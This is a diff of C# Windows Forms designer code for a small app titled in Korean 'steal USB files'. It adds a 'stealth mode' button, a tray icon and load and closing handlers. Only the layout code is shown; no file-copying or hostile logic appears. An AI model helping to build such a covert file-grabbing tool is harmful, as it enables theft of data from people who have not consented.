@@ -29,11 +29,49 @@
         private void InitializeComponent()
         {
             this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.btnHide = new System.Windows.Forms.Button();
+            this.nyiTray = new System.Windows.Forms.NotifyIcon(this.components);
+            this.SuspendLayout();
+            // 
+            // btnHide
+            // 
+            this.btnHide.Location = new System.Drawing.Point(92, 100);
+            this.btnHide.Name = "btnHide";
+            this.btnHide.Size = new System.Drawing.Size(99, 31);
+            this.btnHide.TabIndex = 0;
+            this.btnHide.Text = "스텔스 모드";
+            this.btnHide.UseVisualStyleBackColor = true;
+            this.btnHide.Click += new System.EventHandler(this.btnHide_Click);
+            // 
+            // nyiTray
+            // 
+            this.nyiTray.Icon = ((System.Drawing.Icon)(resources.GetObject("nyiTray.Icon")));
+            this.nyiTray.Text = "notifyIcon1";
+            this.nyiTray.Visible = true;
+            this.nyiTray.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.nyiTray_MouseDoubleClick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 15F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.Text = "Form1";
+            this.ClientSize = new System.Drawing.Size(282, 253);
+            this.Controls.Add(this.btnHide);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "USB 파일 훔치기";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+
         }
 
         #endregion
+
+        private System.Windows.Forms.Button btnHide;
+        private System.Windows.Forms.NotifyIcon nyiTray;
     }
 }
 
